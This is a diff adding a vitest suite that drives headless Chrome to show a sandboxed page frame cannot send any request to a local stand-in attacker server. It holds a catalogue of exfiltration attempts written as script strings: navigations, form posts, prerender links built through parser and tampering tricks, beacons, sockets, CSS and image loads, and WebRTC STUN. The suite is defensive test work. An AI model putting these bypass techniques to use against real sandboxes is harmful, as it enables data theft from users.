@@ -1,0 +1,294 @@
+import { spawn, type ChildProcess } from "node:child_process";
+import { createSocket, type Socket } from "node:dgram";
+import { existsSync, mkdtempSync, rmSync } from "node:fs";
+import { createServer, type Server } from "node:http";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { afterAll, beforeAll, describe, expect, it } from "vitest";
+
+import { GUARD_SCRIPT, pageDocument, wrapperDocument } from "./artifactdoc.js";
+
+/**
+ * Every way out of a page's frame, tried in a real Chrome. Each attempt aims
+ * at a server standing in for an attacker; the test holds that it is sent no
+ * request at all, and that the page was really running when it tried. A
+ * control runs the flat frame KOS had before, which does leak, so the test is
+ * known to see a leak when there is one. Skipped without Chrome.
+ *
+ * What it does not hold: a navigation attempt still makes Chrome open a
+ * connection (DNS and TCP, no request) to the host it names, before the
+ * policy refuses it (artifactdoc.ts). It counts requests, not connections.
+ */
+
+const CHROME = ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium"].find((p) => existsSync(p));
+
+/** The attempts, each a script the page runs once it is up; `E` is the attacker. */
+function attempts(E: string): Record<string, string> {
+  const link = (how: string): string => how;
+  return {
+    href: `location.href = "${E}/href?d=1"`,
+    assign: `location.assign("${E}/assign?d=1")`,
+    replace: `location.replace("${E}/replace?d=1")`,
+    open: `window.open("${E}/open?d=1")`,
+    form: `const f = document.createElement("form"); f.method = "post"; f.action = "${E}/form"; document.body.append(f); f.submit()`,
+    formMarkup: `document.body.innerHTML = '<form action="${E}/formmarkup"></form>'; document.forms[0].submit()`,
+    metaRefresh: `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/meta"; document.head.append(m)`,
+    metaMarkup: `document.head.insertAdjacentHTML("beforeend", '<meta http-equiv="refresh" content="0;url=${E}/metamarkup">')`,
+    anchor: `const a = document.createElement("a"); a.href = "${E}/aself?d=1"; document.body.append(a); a.click()`,
+    anchorBlank: `const a = document.createElement("a"); a.href = "${E}/ablank"; a.target = "_blank"; document.body.append(a); a.click()`,
+    anchorTop: `const a = document.createElement("a"); a.href = "${E}/atop"; a.target = "_top"; document.body.append(a); a.click()`,
+    download: `const a = document.createElement("a"); a.href = "${E}/download"; a.download = "x"; document.body.append(a); a.click()`,
+    top: `top.location = "${E}/top"`,
+    parent: `parent.location = "${E}/parent"`,
+    history: `try { history.pushState({}, "", "${E}/push"); } catch (e) {} location.reload()`,
+    iframeHash: `const f = document.createElement("iframe"); f.src = "${E}/frame#d=1"; document.body.append(f)`,
+    iframeMarkup: `document.body.innerHTML = '<iframe src="${E}/framemarkup#d=1"></iframe>'`,
+    dataNav: `location.href = "data:text/html,<script>fetch('${E}/datanav')<\\/script>"`,
+    blobNav: `location.href = URL.createObjectURL(new Blob(["<script>fetch('${E}/blobnav')<\\/script>"], { type: "text/html" }))`,
+    prerender: link(`const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerender"; document.head.append(l)`),
+    prerenderMarkup: link(`document.body.insertAdjacentHTML("beforeend", '<link rel="pre' + 'render" href="${E}/prerendermarkup">')`),
+    prerenderWrite: link(`document.write('<link rel="prerender" href="${E}/prerenderwrite">')`),
+    prerenderParser: link(`const d = new DOMParser().parseFromString('<link rel="prerender" href="${E}/prerenderparser">', "text/html"); document.head.append(document.adoptNode(d.querySelector("link")))`),
+    prerenderNS: link(`const l = document.createElementNS("http://www.w3.org/1999/xhtml", "link"); l.rel = "prerender"; l.href = "${E}/prerenderns"; document.head.append(l)`),
+    prerenderRange: link(`document.head.append(document.createRange().createContextualFragment('<link rel="prerender" href="${E}/prerenderrange">'))`),
+    prerenderShadow: link(`const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).innerHTML = '<link rel="prerender" href="${E}/prerendershadow">'`),
+    prerenderTemplate: link(`const t = document.createElement("template"); t.innerHTML = '<link rel="prerender" href="${E}/prerendertemplate">'; document.head.append(t.content.cloneNode(true))`),
+    prerenderRealm: link(`const f = document.createElement("iframe"); document.body.append(f); const l = f.contentDocument.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerenderrealm"; document.head.append(l)`),
+    prefetchHints: link(`for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) { const l = document.createElement("link"); l.rel = rel; l.as = "fetch"; l.href = "${E}/" + rel; document.head.append(l); }`),
+    speculation: `const s = document.createElement("script"); s.type = "speculationrules"; s.text = JSON.stringify({ prefetch: [{ source: "list", urls: ["${E}/speculation"] }] }); document.head.append(s)`,
+    fetch: `fetch("${E}/fetch").catch(() => {})`,
+    beacon: `navigator.sendBeacon("${E}/beacon", "d")`,
+    socket: `try { new WebSocket("${E.replace("http", "ws")}/ws"); } catch (e) {} try { new EventSource("${E}/sse"); } catch (e) {}`,
+    worker: `try { new Worker(URL.createObjectURL(new Blob(["fetch('${E}/worker')"], { type: "text/javascript" }))); } catch (e) {}`,
+    css: `const s = document.createElement("style"); s.textContent = "body{background:url(${E}/css)} @font-face{font-family:x;src:url(${E}/font)}"; document.head.append(s)`,
+    image: `new Image().src = "${E}/image"; document.body.insertAdjacentHTML("beforeend", '<svg><image href="${E}/svgimage"/></svg>')`,
+    object: `document.body.insertAdjacentHTML("beforeend", '<object data="${E}/object"></object>')`,
+    // A link made by a document's own parser, never by a factory the guard holds.
+    prerenderCreateDocument: link(`const d = document.implementation.createDocument(XHTML, "link", null); const l = d.documentElement; l.setAttribute("rel", "prerender"); l.setAttribute("href", "${E}/createdocument"); document.head.append(document.adoptNode(l))`),
+    prerenderXhtml: link(`const d = new DOMParser().parseFromString('<x:link xmlns:x="' + XHTML + '" rel="prerender" href="${E}/xhtml"/>', "application/xhtml+xml"); document.head.appendChild(d.documentElement)`),
+    prerenderEntity: link(`const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + XHTML + '&#34; rel=&#34;prerender&#34; href=&#34;${E}/entity&#34;/&#62;">]><r>&e;</r>', "application/xml"); document.head.append(...d.documentElement.childNodes)`),
+    prerenderSvg: link(`const d = new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><link xmlns="' + XHTML + '" rel="prerender" href="${E}/svg"/></foreignObject></svg>', "image/svg+xml"); document.body.append(document.importNode(d.documentElement, true))`),
+    // The page takes back what the guard calls through, then tries again.
+    prerenderTampered: link(`Function.prototype.call = Function.prototype.apply = function () { return null }; RegExp.prototype.exec = RegExp.prototype.test = () => null; Object.defineProperty(Node, Symbol.hasInstance, { value: () => false }); const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/tampered"; document.head.append(l)`),
+    metaClone: `const m = document.querySelector("meta").cloneNode(); m.removeAttribute("charset"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/metaclone"; document.head.append(m)`,
+  };
+}
+
+const XHTML = "http://www.w3.org/1999/xhtml";
+
+/**
+ * Every way this test knows to make an element, crossed with every way to put
+ * a node into a document. A page runs the lot, each in its own try, then
+ * counts the elements no policy governs that ended up in its document: the
+ * guard should leave none, whatever made them and whatever placed them.
+ */
+const FORBIDDEN = ["link", "meta", "iframe", "form", "base", "object", "embed", "script", "frame"];
+const SWEEP = String.raw`
+const makers = {
+  createElement: (t) => document.createElement(t),
+  createElementNS: (t) => document.createElementNS(XHTML, t),
+  createElementNSPrefixed: (t) => document.createElementNS(XHTML, "x:" + t),
+  createElementNSOther: (t) => document.createElementNS("urn:x", t),
+  createDocument: (t) => document.implementation.createDocument(XHTML, t, null).documentElement,
+  createHTMLDocument: (t) => document.implementation.createHTMLDocument("").createElement(t),
+  domParserHtml: (t) => new DOMParser().parseFromString("<" + t + ">", "text/html").querySelector(t),
+  domParserXhtml: (t) => new DOMParser().parseFromString("<x:" + t + ' xmlns:x="' + XHTML + '"/>', "application/xhtml+xml").documentElement,
+  domParserEntity: (t) => new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;' + t + ' xmlns=&#34;' + XHTML + '&#34;/&#62;">]><r>&e;</r>', "application/xml").documentElement.firstChild,
+  domParserSvg: (t) => new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><' + t + ' xmlns="' + XHTML + '"/></foreignObject></svg>', "image/svg+xml").documentElement,
+  innerHTML: (t) => { const d = document.createElement("div"); d.innerHTML = "<" + t + ">"; return d; },
+  template: (t) => { const x = document.createElement("template"); x.innerHTML = "<" + t + ">"; return x.content; },
+  range: (t) => document.createRange().createContextualFragment("<" + t + ">"),
+  setHTMLUnsafe: (t) => { const d = document.createElement("div"); d.setHTMLUnsafe("<" + t + ">"); return d; },
+  parseHTMLUnsafe: (t) => Document.parseHTMLUnsafe("<" + t + ">").querySelector(t),
+  clone: (t) => { const n = document.querySelector(t); return n && n.cloneNode(true); },
+};
+const placers = {
+  appendChild: (n) => document.body.appendChild(n),
+  insertBefore: (n) => document.body.insertBefore(n, document.body.firstChild),
+  replaceChild: (n) => { const s = document.createElement("span"); document.body.append(s); document.body.replaceChild(n, s); },
+  append: (n) => document.body.append(n),
+  prepend: (n) => document.head.prepend(n),
+  replaceChildren: (n) => { const s = document.createElement("div"); document.body.append(s); s.replaceChildren(n); },
+  replaceWith: (n) => { const s = document.createElement("span"); document.body.append(s); s.replaceWith(n); },
+  before: (n) => document.body.firstChild.before(n),
+  after: (n) => document.body.firstChild.after(n),
+  textBefore: (n) => { const s = document.createTextNode(""); document.body.append(s); s.before(n); },
+  insertAdjacentElement: (n) => document.body.insertAdjacentElement("beforeend", n),
+  rangeInsert: (n) => { const r = document.createRange(); r.selectNodeContents(document.body); r.insertNode(n); },
+  rangeSurround: (n) => { const r = document.createRange(); r.selectNodeContents(document.body.lastChild || document.body); r.surroundContents(n); },
+  adopt: (n) => document.body.append(document.adoptNode(n)),
+  import: (n) => document.body.append(document.importNode(n, true)),
+  shadow: (n) => { const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).append(n); },
+};
+const before = {};
+for (const t of TAGS) before[t] = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length;
+let tried = 0, made = 0;
+for (const t of TAGS) for (const make of Object.values(makers)) for (const place of Object.values(placers)) {
+  tried++;
+  let n; try { n = make(t); } catch (e) { continue; }
+  if (!n) continue;
+  made++;
+  try { place(n); } catch (e) {}
+}
+const shadows = [...document.querySelectorAll("div")].map((d) => d.shadowRoot).filter(Boolean);
+const placed = {};
+for (const t of TAGS) {
+  let k = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length - before[t];
+  for (const r of shadows) k += r.querySelectorAll(t).length;
+  if (k) placed[t] = k;
+}
+top.postMessage({ census: { tried, made, placed } }, "*");
+`;
+
+/** A page that says it is up, then tries one way out. */
+const attempt = (code: string): string => `<p>page</p><script>top.postMessage("alive", "*"); setTimeout(() => { try { ${code} } catch (e) {} }, 50)</script>`;
+
+interface Run {
+  alive: boolean;
+  requests: string[];
+  /** What the page told the dashboard, when it says more than that it is up. */
+  said?: string;
+}
+
+describe.skipIf(!CHROME)("a page's frame in a real Chrome", () => {
+  let evil: Server;
+  let host: Server;
+  let chrome: ChildProcess;
+  let profile = "";
+  let E = "";
+  let base = "";
+  const requests: string[] = [];
+  const pages = new Map<string, string>();
+  let send: (method: string, params?: Record<string, unknown>) => Promise<Record<string, unknown>>;
+  let close = (): void => undefined;
+
+  const listen = (server: Server): Promise<number> =>
+    new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve((server.address() as { port: number }).port)));
+
+  beforeAll(async () => {
+    evil = createServer((req, res) => {
+      requests.push(req.url ?? "");
+      res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" }).end("<p>evil</p>");
+    });
+    E = `http://127.0.0.1:${await listen(evil)}`;
+    host = createServer((req, res) => res.writeHead(200, { "content-type": "text/html" }).end(pages.get(req.url ?? "") ?? ""));
+    base = `http://127.0.0.1:${await listen(host)}`;
+    profile = mkdtempSync(join(tmpdir(), "kos-artifact-chrome-"));
+    const port = 9400 + Math.floor(Math.random() * 400);
+    chrome = spawn(CHROME!, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "about:blank"], { stdio: "ignore" });
+    let version: { webSocketDebuggerUrl: string } | undefined;
+    for (let i = 0; i < 300 && !version; i++) {
+      version = await fetch(`http://127.0.0.1:${port}/json/version`).then((r) => r.json() as Promise<{ webSocketDebuggerUrl: string }>).catch(() => undefined);
+      if (!version) await new Promise((r) => setTimeout(r, 100));
+    }
+    const ws = new WebSocket(version!.webSocketDebuggerUrl);
+    await new Promise((r) => (ws.onopen = r));
+    let n = 0;
+    const wait = new Map<number, (m: { result?: Record<string, unknown> }) => void>();
+    ws.onmessage = (e) => {
+      const m = JSON.parse(String(e.data)) as { id?: number; result?: Record<string, unknown> };
+      if (m.id) wait.get(m.id)?.(m);
+    };
+    const raw = (method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<Record<string, unknown>> =>
+      new Promise((resolve) => {
+        const id = ++n;
+        wait.set(id, (m) => resolve(m.result ?? {}));
+        ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
+      });
+    const target = await raw("Target.createTarget", { url: "about:blank" });
+    const session = (await raw("Target.attachToTarget", { targetId: target.targetId, flatten: true })).sessionId as string;
+    send = (method, params = {}) => raw(method, params, session);
+    close = () => ws.close();
+  }, 30_000);
+
+  afterAll(async () => {
+    close();
+    // Chrome writes its profile as it goes; the folder goes once it has exited.
+    if (chrome && chrome.exitCode === null) await new Promise((r) => (chrome.once("exit", r), chrome.kill()));
+    evil?.close();
+    host?.close();
+    if (profile) rmSync(profile, { recursive: true, force: true, maxRetries: 5 });
+  });
+
+  /** The dashboard's side: the frame as ArtifactPage draws it, around one page. */
+  async function run(name: string, frame: string): Promise<Run> {
+    const path = `/${name}`;
+    pages.set(path, `<!doctype html><body><script>addEventListener("message", (e) => { if (e.data === "alive") document.title = "alive"; else if (e.data && e.data.census) document.body.dataset.said = JSON.stringify(e.data.census); })</script><iframe sandbox="allow-scripts" srcdoc="${frame.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe></body>`);
+    requests.length = 0;
+    await send("Page.navigate", { url: `${base}${path}` });
+    await new Promise((r) => setTimeout(r, 1300));
+    const title = (await send("Runtime.evaluate", { expression: "document.title", returnByValue: true })).result as { value?: string } | undefined;
+    const said = (await send("Runtime.evaluate", { expression: "document.body.dataset.said || ''", returnByValue: true })).result as { value?: string } | undefined;
+    return { alive: title?.value === "alive", requests: [...requests], ...(said?.value ? { said: said.value } : {}) };
+  }
+
+  const page = (code: string): string => pageDocument({ html: attempt(`const XHTML = "${XHTML}"; ${code}`), tokens: {}, mode: "dark", css: "", libraries: [] });
+  /** The same page with the guard taken out, for the controls. */
+  const unguarded = (code: string): string => page(code).replace(`<script>${GUARD_SCRIPT}</script>`, "").replace("; require-trusted-types-for 'script'; trusted-types default", "");
+
+  it("sees a leak when there is one: the flat frame KOS had sends a navigation's request", async () => {
+    const flat = await run("control", page(attempts(E).href!).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">`));
+    expect(flat.alive).toBe(true);
+    expect(flat.requests.join(" ")).toContain("/href");
+  }, 20_000);
+
+  it("sees a placed element when there is one: the sweep without the guard places every kind", async () => {
+    const bare = await run("sweep-control", wrapperDocument(unguarded(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
+    expect(bare.alive).toBe(true);
+    const census = JSON.parse(bare.said ?? "{}") as { placed?: Record<string, number> };
+    expect(Object.keys(census.placed ?? {}).sort()).toEqual([...FORBIDDEN].sort());
+  }, 20_000);
+
+  it("places none of them, made and placed every way there is", async () => {
+    const swept = await run("sweep", wrapperDocument(page(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
+    expect(swept.alive).toBe(true);
+    const census = JSON.parse(swept.said ?? "{}") as { tried: number; made: number; placed: Record<string, number> };
+    // Some routes do still make one (a parser, a clone of the page's own <meta>); none may place it.
+    expect(census.tried).toBe(FORBIDDEN.length * 16 * 16);
+    expect(census.made).toBeGreaterThan(0);
+    expect(census.placed).toEqual({});
+    expect(swept.requests).toEqual([]);
+  }, 20_000);
+
+  /*
+   * WebRTC reaches the network beside every policy: ICE sends STUN over UDP
+   * to whatever server the page names. A listener stands in for one.
+   */
+  describe("WebRTC", () => {
+    const sockets: Socket[] = [];
+    /** A STUN server of its own for each run, so a straggler from one is never counted in another. */
+    async function stunServer(): Promise<{ url: string; packets: number[] }> {
+      const udp = createSocket("udp4");
+      sockets.push(udp);
+      const packets: number[] = [];
+      udp.on("message", (m) => packets.push(m.length));
+      await new Promise<void>((r) => udp.bind(0, "127.0.0.1", r));
+      return { url: `stun:127.0.0.1:${udp.address().port}`, packets };
+    }
+    afterAll(() => sockets.forEach((u) => u.close()));
+    const offer = (stun: string): string => `const pc = new RTCPeerConnection({ iceServers: [{ urls: "${stun}" }] }); pc.createDataChannel("d"); pc.createOffer().then((o) => pc.setLocalDescription(o))`;
+
+    it("sees the packets when WebRTC is there", async () => {
+      const stun = await stunServer();
+      const bare = await run("rtc-control", wrapperDocument(unguarded(offer(stun.url))));
+      expect(bare.alive).toBe(true);
+      expect(stun.packets.length).toBeGreaterThan(0);
+    }, 20_000);
+
+    it("sends none from a page", async () => {
+      const stun = await stunServer();
+      const guarded = await run("rtc", wrapperDocument(page(`${offer(stun.url)}; try { new webkitRTCPeerConnection({}) } catch (e) {}`)));
+      expect(guarded.alive).toBe(true);
+      expect(stun.packets).toEqual([]);
+    }, 20_000);
+  });
+
+  it("lets no way out send a single request, with the page running each time", async () => {
+    const results: Record<string, Run> = {};
+    for (const [name, code] of Object.entries(attempts(E))) results[name] = await run(name, wrapperDocument(page(code)));
+    const notRunning = Object.entries(results).filter(([, r]) => !r.alive).map(([name]) => name);
+    const leaked = Object.fromEntries(Object.entries(results).filter(([, r]) => r.requests.length > 0).map(([name, r]) => [name, r.requests]));
+    expect(notRunning).toEqual([]);
+    expect(leaked).toEqual({});
+  }, 180_000);
+});
